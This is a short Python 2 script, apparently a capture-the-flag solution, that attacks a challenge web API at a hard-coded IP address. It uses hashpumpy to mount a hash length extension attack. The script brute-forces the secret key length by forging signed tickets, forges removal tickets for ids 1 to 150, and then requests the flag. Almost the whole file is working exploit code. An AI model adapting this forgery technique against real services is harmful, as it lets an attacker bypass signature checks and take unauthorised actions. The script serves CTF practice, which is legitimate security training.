#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 6/5/2019 10:15 AM
# @Author  : fz
# @Site    : 
# @File    : test.py
# @Software: PyCharm


import hashpumpy
import requests
import json
import time
from urllib import quote_plus




def get_hash(hash_val,org,app,len):

    result= []
    tmp = hashpumpy.hashpump(hash_val, org, app, len)
    hash = tmp[0]
    hex_str = tmp[1]
    url_str = quote_plus(hex_str)
    result.append(hash)
    result.append(hex_str)
    result.append(url_str)

    return result

class remove_robot(object):

	def __init__(self, user_name, password, id, hash):

		self.s = requests.session()
		self.r = self.s.get('http://117.51.147.155:5050/ctf/api/login?name={}&password={}'.format(user_name, password))
		self.id = id
		self.flag = ''
		self.hash = hash
		self.len = 0

	def remove_robot(self):

		for i in range(1, 151):

			m = get_hash(self.hash, 'id{}'.format(self.id), 'id{}'.format(i), 31)
			hash = m[0]
			print m[2]
			str = ''.join(m[2].rsplit('id{}'.format(i), 1))
			print str
			print "http://117.51.147.155:5050/ctf/api/remove_robot?{}=&id={}&ticket={}".format(str, i, hash)
			r = self.s.get("http://117.51.147.155:5050/ctf/api/remove_robot?{}=&id={}&ticket={}".format(str, i, hash))
			print r.text
			time.sleep(1)
			if json.loads(r.text)['code'] == 200:
				print(i)

		return 'success'


	def get_key_len(self):

		for i in range(1,50):
			m = get_hash(self.hash, 'id{}'.format(self.id),'id{}'.format(self.id), i)
			hash = m[0]
			str = m[2].rstrip('id{}'.format(self.id))
			r = self.s.get("http://117.51.147.155:5050/ctf/api/remove_robot?{}=&id={}&ticket={}".format(str,self.id,hash))
			time.sleep(1)
			if json.loads(r.text)['code'] == 200:
				self.len = i
				print 'key_len'
				print (self.len)
				break
		return self.len

	def get_flag(self):

		r = self.s.get('http://117.51.147.155:5050/ctf/api/get_flag')

		print r.text
		return r.text

if __name__ == "__main__":

	test = remove_robot(user_name='fangzhao_test',password='12345678',id='89', hash ='db642a8954bfae0f41d841b9aca1efee')
	test.get_key_len()
	test.remove_robot()
	test.get_flag()








